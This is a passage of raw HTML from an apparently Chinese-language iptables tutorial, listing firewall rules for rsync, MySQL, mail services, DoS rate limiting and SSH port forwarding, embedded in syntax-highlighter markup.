crayon-striped-line\" id=\"crayon-594b21c976ce0487275447-2\"><span class=\"crayon-p\">#iptables -A INPUT -p tcp --dport 111 -j ACCEPT</span></div><div class=\"crayon-line\" id=\"crayon-594b21c976ce0487275447-3\"><span class=\"crayon-p\">#iptables -A INPUT -p udp --dport 111 -j ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976ce0487275447-4\"><span class=\"crayon-p\">#iptables -A INPUT -p tcp --dport 853 -j ACCEPT</span></div><div class=\"crayon-line\" id=\"crayon-594b21c976ce0487275447-5\"><span class=\"crayon-p\">#iptables -A INPUT -p udp --dport 853 -j ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976ce0487275447-6\"><span class=\"crayon-p\">#iptables -A INPUT -p tcp --dport 850 -j ACCEPT</span></div><div class=\"crayon-line\" id=\"crayon-594b21c976ce0487275447-7\"><span class=\"crayon-p\">#iptables -A INPUT -p udp --dport 850 -j ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h3># 18. 允许某个特定网络 rsync 进入本机</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976ce3176015865\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT\r\n#iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976ce3176015865-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976ce3176015865-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976ce3176015865-1\"><span class=\"crayon-p\">#iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976ce3176015865-2\"><span class=\"crayon-p\">#iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3># 19. 仅允许来自某个特定网络的 MySQL 的链接</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976ce6289074555\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT\r\n#iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976ce6289074555-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976ce6289074555-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976ce6289074555-1\"><span class=\"crayon-p\">#iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976ce6289074555-2\"><span class=\"crayon-p\">#iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3># 20. 允许 Sendmail 或 Postfix</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976ce9853197312\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -A INPUT -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT\r\niptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976ce9853197312-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976ce9853197312-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976ce9853197312-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">dport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-r\">NEW</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976ce9853197312-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">OUTPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">sport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">state </span><span class=\"crayon-v\">ESTABLISHED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p></p>\n<h3># 21. 允许 IMAP 和 IMAPS</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cec607239925\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#iptables -A INPUT -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT\r\n#iptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPT\r\n#iptables -A INPUT -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT\r\n#iptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cec607239925-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cec607239925-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21c976cec607239925-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cec607239925-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cec607239925-1\"><span class=\"crayon-p\">#iptables -A INPUT -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cec607239925-2\"><span class=\"crayon-p\">#iptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPT</span></div><div class=\"crayon-line\" id=\"crayon-594b21c976cec607239925-3\"><span class=\"crayon-p\">#iptables -A INPUT -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cec607239925-4\"><span class=\"crayon-p\">#iptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3># 22. 允许 POP3 和 POP3S</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cef125543191\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#iptables -A INPUT -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT\r\n#iptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPT\r\n#iptables -A INPUT -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT\r\n#iptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cef125543191-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cef125543191-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21c976cef125543191-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cef125543191-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cef125543191-1\"><span class=\"crayon-p\">#iptables -A INPUT -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cef125543191-2\"><span class=\"crayon-p\">#iptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPT</span></div><div class=\"crayon-line\" id=\"crayon-594b21c976cef125543191-3\"><span class=\"crayon-p\">#iptables -A INPUT -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cef125543191-4\"><span class=\"crayon-p\">#iptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3># 23. 防止 DoS 攻击</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cf3763511632\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cf3763511632-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cf3763511632-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">dport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">80</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">limit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">limit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">minute</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">limit</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">burst</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n<h3># 24. 设置 422 端口转发到 22 端口</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cf6773057121\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#iptables -t nat -A PREROUTING -p tcp -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22\r\n#iptables -A INPUT -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT\r\n#iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cf6773057121-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cf6773057121-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21c976cf6773057121-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cf6773057121-1\"><span class=\"crayon-p\">#iptables -t nat -A PREROUTING -p tcp -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cf6773057121-2\"><span class=\"crayon-p\">#iptables -A INPUT -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT</span></div><div class=\"crayon-line\" id=\"crayon-594b21c976cf6773057121-3\"><span class=\"crayon-p\">#iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED 